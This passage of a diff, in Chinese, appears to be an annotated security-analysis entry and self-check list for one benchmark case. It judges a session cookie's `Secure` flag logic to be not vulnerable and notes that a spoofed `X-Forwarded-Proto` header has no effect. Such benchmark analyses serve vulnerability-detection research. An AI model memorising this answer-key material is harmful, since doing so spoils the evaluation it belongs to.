+（样本外假设: 若容器部署于 TLS 终结反代之后且未配置协议感知（如 RemoteIpValve/连接器配置），`isSecure()` 恒 false → 会话 cookie 恒缺 `Secure`，方向为过松而非可注入，需补容器配置）
+载荷: 不适用；发送 `X-Forwarded-Proto: https` 不影响 L8 返回值
+组合链: 无
+锚句: 非 CWE-807 因判定输入不再是请求方可控数据；非 CWE-614 因 secure 位的正确性交由容器层，样本内无可注入路径
+结论: 存在漏洞=false | CWE-无 无 | Low
+修复: 无必须修复项；反代部署需在容器层配置协议感知以保证 `isSecure()` 语义正确（运维配置，样本外）
+
+自查清单（441-15）:
+- [x] 每条分析第一行是 `### <案例编号> <版本>`，两版本各一条
+- [x] 行号全部真实存在，变量/函数名均出自本包代码
+- [x] 判"有漏洞"已逐条核验并排除防御
+- [x] 判"安全"已枚举全部入口（HTTP 头、容器属性）并逐段核验防御
+- [x] 版本A 分析未引用版本B 任何内容，结论仅来自该版本自身代码
+- [x] 依赖容器配置的判断已标注"样本外假设"
+- [x] 未将其他案例的行号/变量/结论写入本包
+- [x] 代码完整无截断，未猜测补全
+- [x] 本包无 SQL 场景，该条不适用，已确认未依赖参数化论证
